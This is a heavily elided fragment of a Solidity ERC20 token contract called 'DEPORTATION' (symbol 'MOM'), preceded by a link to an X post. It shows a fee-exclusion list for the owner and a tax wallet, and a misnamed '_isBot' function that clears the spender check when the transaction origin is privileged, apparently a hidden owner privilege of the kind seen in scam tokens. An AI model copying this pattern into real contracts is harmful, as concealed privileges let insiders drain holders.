...
/*
https://x.com/isfjmocha/status/2023478261297357258
*/
...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isMOMExcludedFromFees;
    ...
    string private _name = unicode"DEPORTATION";
    string private _symbol = unicode"MOM";
    ...
    constructor() payable {
        ...
        _isMOMExcludedFromFees[owner()] = true;
        _isMOMExcludedFromFees[address(this)] = true;
        _isMOMExcludedFromFees[_taxWallet] = true;
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isMOMExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
